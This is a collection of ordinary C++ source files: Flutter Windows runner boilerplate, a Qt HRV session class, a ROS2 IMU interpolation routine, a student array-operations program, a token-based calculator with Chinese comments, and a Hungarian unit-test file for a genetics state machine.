    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"session.h\"\n\n#include <QString>\n#include <QDebug>\n\nSession::Session()\n{\n    // initialize the timer\n    timer = new QTimer(this);\n}\n\nSession::~Session(){\n    delete timer;\n}\n\nint Session::getTime() {return time;}\ndouble Session::getAverageCoherence() {return averageCoherence;}\nint Session::getBreathPacer() {return breathPacer;}\nQTimer* Session::getTimer() {return timer;}\nQString Session::getCoherenceString(){return coherenceString;}\n\nvoid Session::setTime(int time){this->time=time;}\nvoid Session::setAverageCoherence(double averageCoherence){this->averageCoherence=averageCoherence;}\nvoid Session::setBreathPacer(int breathPacer){this->breathPacer=breathPacer;}\nvoid Session::setCoherenceString(QString coherenceString){\n    this->coherenceString= coherenceString;\n    this->name = QString(coherenceString + \" Coherence Test\");\n}\nvoid Session::setTimeString(QString timeString){this->timeString = timeString;}\nvoid Session::setAverageHrv(QString averageHrv){\n    this->averageHrv = averageHrv;\n}\n\nQString Session::toString(){\n    QString returnString;\n\n    returnString.append(\"************~~~~~~~~~~*********\\n\");\n\n    returnString.append(name);\n    returnString.append(\"\\nCoherence score: \");\n    returnString.append(QString::number(averageCoherence));\n    returnString.append(\"\\nAchievment score: \");\n    returnString.append(QString::number(achievmentScore));\n    returnString.append(\"\\nDuration: \");\n    returnString.append(timeString);\n    returnString.append(\"\\nBreath Pacer: \");\n    returnString.append(QString::number(breathPacer));\n    returnString.append(\"\\n\");\n    returnString.append(\"Average HRV: \\n\");\n    returnString.append(averageHrv);\n\n    returnString.append(\"\\n************~~~~~~~~~~*********\\n\");\n\n    return returnString;\n}\n\nQVector<double> Session::getCoherenceList() {return this->coherenceList;}\nvoid Session::appendCoherence(double newVal) {\n    this->coherenceList.append(newVal);\n}\n\nvoid Session::setAchievmentScore(int achievment){\n    this->achievmentScore = achievment;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "//Implement Array and write a menu driven program to perform all the operation on array elements.\n#include <iostream>\nusing namespace std;\n\nconst int MAX_SIZE = 100;\n\nclass array_operations {\nprivate:\n    int arr[MAX_SIZE];\n    int size;\n\npublic:\n    array_operations() {\n        size = 0;\n    }\n    array_operations(int initial_array[], int initial_size) {\n        if (initial_size <= MAX_SIZE) {\n            for (int i = 0; i < initial_size; ++i) {\n                arr[i] = initial_array[i];\n            }\n            size = initial_size;\n        } else {\n            cerr << \"Initial array size exceeds maximum size.\" << endl;\n        }\n    }\n    void display_array() {\n        if (size == 0) {\n            cout << \"Array is empty.\" << endl;\n            return;\n        }\n        cout << \"Array elements: \";\n        for (int i = 0; i < size; i++) {\n            cout << arr[i] << \" \";\n        }\n        cout << endl;\n    }\n    void insert_at_end(int element) {\n        if (size < MAX_SIZE) {\n            arr[size++] = element;\n            cout << \"Element inserted at the end successfully.\" << endl;\n        } else {\n            cout << \"Array is full. Cannot insert element.\" << endl;\n        }\n    }\n    void insert_at_beginning(int element) {\n        if (size < MAX_SIZE) {\n            for (int i = size; i > 0; i--) {\n                arr[i] = arr[i - 1];\n            }\n            arr[0] = element;\n            size++;\n            cout << \"Element inserted at the beginning successfully.\" << endl;\n        } else {\n            cout << \"Array is full. Cannot insert element.\" << endl;\n        }\n    }\n    void insert_before_element(int element, int target) {\n        int index = -1;\n        for (int i = 0; i < size; i++) {\n            if (arr[i] == target) {\n                index = i;\n                break;\n            }\n        }\n        if (index != -1) {\n            if (size < MAX_SIZE) {\n                for (int i = size; i > index; i--) {\n                    arr[i] = arr[i - 1];\n                }\n                arr[index] = element;\n                size++;\n                cout << \"Element inserted before \" << target << \" successfully.\" << endl;\n            } else {\n                cout << \"Array is full. Cannot insert element.\" << endl;\n            }\n        } else {\n            cout << \"Element not found in the array.\" << endl;\n        }\n    }\n    void insert_after_element(int element, int target) {\n        int index = -1;\n        for (int i = 0; i < size; i++) {\n            if (arr[i] == target) {\n                index = i;\n                break;\n            }\n        }\n        if (index != -1) {\n            if (size < MAX_SIZE) {\n                for (int i = size; i > index + 1; i--) {\n                    arr[i] = arr[i - 1];\n                }\n                arr[index + 1] = element;\n                size++;\n                cout << \"Element inserted after \" << target << \" successfully.\" << endl;\n            } else {\n                cout << \"Array is full. Cannot insert element.\" << endl;\n            }\n        } else {\n            cout << \"Element not found in the array.\" << endl;\n        }\n    }\n    void delete_at_end() {\n        if (size > 0) {\n            size--;\n            cout << \"Element deleted from the end successfully.\" << endl;\n        } else {\n            cout << \"Array is empty. Cannot delete element.\" << endl;\n        }\n    }\n    void delete_at_beginning() {\n        if (size > 0) {\n            for (int i = 0; i < size - 1; i++) {\n                arr[i] = arr[i + 1];\n            }\n            size--;\n            cout << \"Element deleted from the beginning successfully.\" << endl;\n        } else {\n            cout << \"Array is empty. Cannot delete element.\" << endl;\n        }\n    }\n    void delete_before_element(int target) {\n        int index = -1;\n        for (int i = 0; i < size; i++) {\n            if (arr[i] == target) {\n                index = i;\n                break;\n            }\n        }\n        if (index != -1 && index > 0) {\n            for (int i = index - 1; i < size - 1; i++) {\n                arr[i] = arr[i + 1];\n            }\n            size--;\n            cout << \"Element deleted before \" << target << \" successfully.\" << endl;\n        } else {\n            cout << \"Element not found in the array or no element before it.\" << endl;\n        }\n    }\n    void delete_after_element(int target) {\n        int index = -1;\n        for (int i = 0; i < size; i++) {\n            if (arr[i] == target) {\n                index = i;\n                break;\n            }\n        }\n        if (index != -1 && index < size - 1) {\n            for (int i = index + 1; i < size - 1; i++) {\n                arr[i] = arr[i + 1];\n            }\n            size--;\n            cout << \"Element deleted after \" << target << \" successfully.\" << endl;\n        } else {\n            cout << \"Element not found in the array or no element after it.\" << endl;\n        }\n    }\n    void search_element(int element) {\n        bool found = fals",
    "#include \"std_lib_facilities.h\"\n\n\nconst char number = '8';    // t.kind==number \u8868\u793a t \u662f\u4e00\u4e2a\u6570\u5b57\u578bToken\nconst char quit   = 'q';    // t.kind==quit means \u8868\u793a t \u662f\u9000\u51fa\u578bToken\nconst char print  = ';';    // t.kind==print means that t \u662f\u6253\u5370\u578bToken\nconst char name   = 'a';    // \u53d8\u91cf\u540dToken\nconst char let    = 'L';    // \u5b9a\u4e49\u53d8\u91cftoken\nconst string declkey = \"let\";// \u5b9a\u4e49\u53d8\u91cf\u7684\u5173\u952e\u5b57\nconst string prompt  = \"> \"; // \u8f93\u5165\u63d0\u793a\u7b26\nconst string result  = \"= \"; // \u8f93\u51fa\u63d0\u793a\u7b26\n\n\n\nclass Token {\npublic:\n    char kind;        // token\u7684\u7c7b\u578b\n    double value;     // for numbers: token\u7684\u503c\n    string name;      // for names: token\u7684\u540d\u79f0\n    Token(char ch)             : kind(ch), value(0)   {}\n    Token(char ch, double val) : kind(ch), value(val) {}\n    Token(char ch, string n)   : kind(ch), name(n)    {}\n};\n\n\nclass Token_stream {\npublic: \n    Token_stream();   // \u4ececin\u4e2d\u5f97\u5230token\u6d41\n    Token get();      // \u5f97\u5230token\n    void putback(Token t);    // \u628atoken\u653e\u56de\u6d41\u4e2d\n    void ignore(char c);      // \u9519\u8bef\u6062\u590d\nprivate:\n    bool full;\n    Token buffer;\n};\n\n\n// \u521d\u59cb\u5316token_stream\nToken_stream::Token_stream()\n:full(false), buffer(0)    \n{\n}\n\nvoid Token_stream::putback(Token t)\n{\n    if (full) error(\"putback() into a full buffer\");\n    buffer = t;       \n    full = true;      \n}\n\n// \u4ece\u6807\u51c6\u8f93\u5165\u4e2d\u8bfb\u5b57\u7b26\u5e76\u7ec4\u6210 Token\nToken Token_stream::get()\n{\n    if (full) {         // check if we already have a Token ready\n        full=false;\n        return buffer;\n    }  \n\n    char ch;\n    cin >> ch;          // note that >> skips whitespace (space, newline, tab, etc.)\n\n    switch (ch) {\n    case quit:\n    case print:\n    case '(':\n    case ')':\n    case '+':\n    case '-':\n    case '*':\n    case '/': \n    case '%':\n    case '=':\n        return Token(ch); // let each character represent itself\n    case '.':             // a floating-point literal can start with a dot\n    case '0': case '1': case '2': case '3': case '4':\n    case '5': case '6': case '7': case '8': case '9':    // numeric literal\n    {\n        cin.putback(ch);// put digit back into the input stream\n        double val;\n        cin >> val;     // read a floating-point number\n        return Token(number,val);\n    }\n    default:\n        if (isalpha(ch)) {\n            string s;\n            s += ch;\n            while (cin.get(ch) && (isalpha(ch) || isdigit(ch))) s+=ch;\n            cin.putback(ch);\n            if (s == declkey) return Token(let); // keyword \"let\"\n            return Token(name,s);\n        }\n        error(\"Bad token\");\n    }\n}\n\n// \u5982\u679c\u7f13\u51b2\u533a\u4e2d\u7684\u5b57\u7b26\u662fc\u5c31\u4e22\u6389\u5e76\u8fd4\u56de\uff0c\u5426\u5219\u4e00\u76f4\u4ececin\u4e2d\u8bfb\u53d6\u76f4\u5230\u9047\u89c1c\n// \u76ee\u7684\u662f\u5904\u7406\u4e00\u884c\u4e2d\u6709\u591a\u4e2a\u8f93\u5165\uff0c\u5176\u4e2d\u6709\u9519\u8bef\u7684\u8f93\u5165\uff0c\u4ee5\u4ece\u9519\u8bef\u4e2d\u6062\u590d\nvoid Token_stream::ignore(char c)\n{\n    // first look in buffer:\n    if (full && c==buffer.kind) {\n        full = false;\n        return;\n    }\n    full = false;\n\n    // now search input:\n    char ch = 0;\n    while (cin>>ch)\n        if (ch==c) return;\n}\n\n\nToken_stream ts;\n\n\nclass Variable {\npublic:\n    string name;\n    double value;\n    Variable (string n, double v) :name(n), value(v) { }\n};\n\n\nvector<Variable> var_table;\n\n// \u8fd4\u56de\u540d\u4e3a s \u7684\u53d8\u91cf\u7684\u503c\ndouble get_value(string s)\n{\n    for (int i = 0; i<var_table.size(); ++i)\n        if (var_table[i].name == s) return var_table[i].value;\n    error(\"get: undefined variable \", s);\n}\n\n// \u8bbe\u7f6e\u540d\u4e3a s \u7684\u53d8\u91cf\u7684\u503c\u4e3a d\nvoid set_value(string s, double d)\n{\n    for (int i = 0; i<var_table.size(); ++i)\n        if (var_table[i].name == s) {\n            var_table[i].value = d;\n            return;\n        }\n    error(\"set: undefined variable \", s);\n}\n\n// \u5224\u65ad\u540d\u4e3a var \u7684\u53d8\u91cf\u662f\u5426\u5df2\u7ecf\u58f0\u660e\nbool is_declared(string var)\n{\n    for (int i = 0; i<var_table.size(); ++i)\n        if (var_table[i].name == var) return true;\n    return false;\n}\n\n// \u58f0\u660e\u53d8\u91cf var, \u8d4b\u503c\u4e3a val\ndouble define_name(string var, double val)\n{\n    if (is_declared(var)) error(var,\" declared twice\");\n    var_table.push_back(Variable(var,val));\n    return val;\n}\n\n// \u51fd\u6570\u58f0\u660e\ndouble expression();    \n\n\ndouble primary()\n{\n    Token t = ts.get();\n    switch (t.kind) {\n    case '(':           // \u5904\u7406 '(' expression ')'\n        {\n            double d = expression();\n            t = ts.get();\n            if (t.kind != ')') error(\"')' expected\");\n            return d;\n        }\n    case number:    \n        return t.value;    \n    case name:\n        return get_value(t.name); \n    // \u5904\u7406\u8d1f\u6570\n    case '-':\n        return - primary();\n    case '+':\n        return primary();\n    default:\n        error(\"primary expected\");\n    }\n}\n\n\n\ndouble term()\n{\n    double left = primary();\n    Token t = ts.get(); // \u4ece\u5355\u8bcd\u6d41\u4e2d\u83b7\u53d6\u5355\u8bcd\n\n    while(true) {\n        switch (t.kind) {\n        case '*':\n            left *= primary();\n            t = ts.get();\n            break;\n        case '/':\n            {    \n                double d = primary();\n                if (d == 0) error(\"divide by zero\");\n                left /= d; \n                t = ts.get();\n                break;\n            }\n        // \u5b9e\u73b0\u6a21\u8fd0\u7b97\n        case '%':\n            {    \n                int i1 = narrow_cast<int>(left);\n                int i2 = narrow_cast<int>(term());\n                if (i2 == 0) error(\"%: divide by zero\");\n                left = i1%i2; \n                t = ts.get();\n     ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\n * Imu.cpp\n *\n *  Created on: Apr 30, 2021\n *      Author: jelavice\n */\n\n#include \"icp_localization_ros2/transform/ImuReading.hpp\"\n\n#include \"icp_localization_ros2/common/math.hpp\"\n\n// #include <eigen_conversions/eigen_msg.h>\n\nnamespace icp_loco {\n\nTimestampedImuReading interpolate(const TimestampedImuReading &start,\n                                  const TimestampedImuReading &end,\n                                  const Time &time) {\n  if (time > end.time_ || time < start.time_) {\n    throw std::runtime_error(\n        \"imu interpolate: query time is not between start and end time\");\n  }\n\n  const auto &s = start.imu_;\n  const auto &e = end.imu_;\n  TimestampedImuReading retVal;\n  retVal.imu_.acceleration() = interpolateVector(\n      s.acceleration(), e.acceleration(), start.time_, end.time_, time);\n  retVal.imu_.angularVelocity() = interpolateVector(\n      s.angularVelocity(), e.angularVelocity(), start.time_, end.time_, time);\n  retVal.imu_.rotation() = interpolateQuaternion(s.rotation(), e.rotation(),\n                                                 start.time_, end.time_, time);\n  return retVal;\n}\n\nTimestampedImuReading fromRos(const sensor_msgs::msg::Imu &msg) {\n  Eigen::Vector3d lin{msg.linear_acceleration.x, msg.linear_acceleration.y,\n                      msg.linear_acceleration.z},\n      ang{msg.angular_velocity.x, msg.angular_velocity.y,\n          msg.angular_velocity.z};\n  Eigen::Quaterniond q{msg.orientation.w, msg.orientation.x, msg.orientation.y,\n                       msg.orientation.z};\n  // tf::vectorMsgToEigen(msg.linear_acceleration, lin);\n  // tf::vectorMsgToEigen(msg.angular_velocity, ang);\n  // tf::quaternionMsgToEigen(msg.orientation, q);\n  TimestampedImuReading retVal;\n  retVal.imu_ = ImuReadingd(lin, ang, q);\n  retVal.time_ = fromRos(msg.header.stamp);\n  return retVal;\n}\n\n} // namespace icp_loco\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/**\n * \\file genetika_teszt.cpp\n *\n * Genetika nev\u0171 szorgalmi feladat tesztjei gtest_lite eszk\u00f6zk\u00e9szlet\u00e9vel megval\u00f3s\u00edtva.\n * A szorgalmi feladat megold\u00e1s\u00e1hoz ezt az \u00e1llom\u00e1nyt nem kell beadni (felt\u00f6lteni).\n *\n * A ELKESZULT makr\u00f3 vez\u00e9rli az egyes tesztesetek ford\u00edt\u00e1s\u00e1t, ezzel lehet\u0151v\u00e9 v\u00e1lik\n * hogy kisebb l\u00e9p\u00e9sekben tesztelj\u00fcnk.\n * Kezdetben ez 0, azaz nem tesztel semmit!\n *\n */\n\n#include <iostream>\n\n#include \"gtest_lite.h\"\n#include \"allapotgep.h\"\n#include \"memtrace.h\"\n\n#define ELKESZULT 3\n\nint main() {\n    GTINIT(std::cin); // Csak C(J)PORTA m\u0171k\u00f6d\u00e9s\u00e9hez kell\n    #if ELKESZULT > 0\n    /// Azt vizsg\u00e1lja, hogy dob-e hib\u00e1t a f\u00e1jl megnyit\u00e1sakor\n        TEST(Konfig, KonfigHiba) {\n            Allapotgep gep;\n            try {\n                EXPECT_THROW_THROW(gep.konfigural(\"nincs_ilyen_fajl\"), const char* p);\n            } catch (const char *p) {\n            #ifdef CPORTA\n                EXPECT_ENVCASEEQ(\"ORG_ID\", p);\n            #endif\n            }\n        } END\n    #endif // ELKESZULT > 0\n\n    #if ELKESZULT > 1\n    /// Azt vizsg\u00e1lja, hogy be tudja-e olvasni a konfigur\u00e1ci\u00f3s f\u00e1jlt\n        TEST(ParosTrimin, fajbolkonfig1) {\n            Allapotgep gep;\n            ASSERT_NO_THROW(gep.konfigural(\"paros.txt\"));\n            EXPECT_STREQ(\"ParosTimin\", gep.aktualisallapot());\n        } END\n    #endif // ELKESZULT > 1\n\n    #if ELKESZULT > 1\n    /// Kipr\u00f3b\u00e1lja az egyik p\u00e9dakonfigot\n        TEST(ParosTrimin, fajbolkonfig1) {\n            Allapotgep gep;\n            ASSERT_NO_THROW(gep.konfigural(\"paros.txt\"));\n            EXPECT_STREQ(\"ParosTimin\", gep.aktualisallapot());\n            Bazis demo[] = {Timin, Citozin, Guanin, Adenin, Timin};\n            EXPECT_EQ(true, gep.feldolgoz(demo, 5));\n            gep.alaphelyzet();\n            EXPECT_STREQ(\"ParosTimin\", gep.aktualisallapot());\n            EXPECT_EQ(true, gep.elfogad());\n            EXPECT_EQ(false, gep.feldolgoz(demo, 4));\n        } END\n    #endif\n\n    #if ELKESZULT > 2\n    /// Kipr\u00f3b\u00e1lja az m\u00e1sik p\u00e9dakonfigot\n        TEST(Implikacio: AA->CC, fajbolkonfig2) {\n            Allapotgep gep;\n            ASSERT_NO_THROW(gep.konfigural(\"implikacio.txt\"));\n            EXPECT_STREQ(\"Alap\", gep.aktualisallapot());\n            Bazis demo[] = {Adenin, Adenin, Timin, Citozin, Adenin, Citozin, Citozin, Guanin};\n            EXPECT_EQ(true, gep.feldolgoz(demo, 8));\n            gep.alaphelyzet();\n            gep.atmenet(Citozin);\n            EXPECT_STREQ(\"C1\", gep.aktualisallapot());\n            gep.atmenet(Adenin);\n            gep.atmenet(Timin);\n            EXPECT_STREQ(\"A1\", gep.aktualisallapot());\n            Bazis test[] = {Citozin, Citozin, Timin, Adenin, Guanin, Citozin};\n            gep.feldolgoz(test, 6);\n            EXPECT_STREQ(\"C2\", gep.aktualisallapot());\n        } END\n    #endif\n\n    /// Itt a v\u00e9ge\n    if (ELKESZULT < 3)\n      ADD_FAILURE() << \"\\nNem futott minden teszteset!\" << std::endl;\n\n    GTEND(std::cerr); // Csak C(J)PORTA m\u0171k\u00f6d\u00e9s\u00e9hez kell\n    return 0;\n}\n\n",
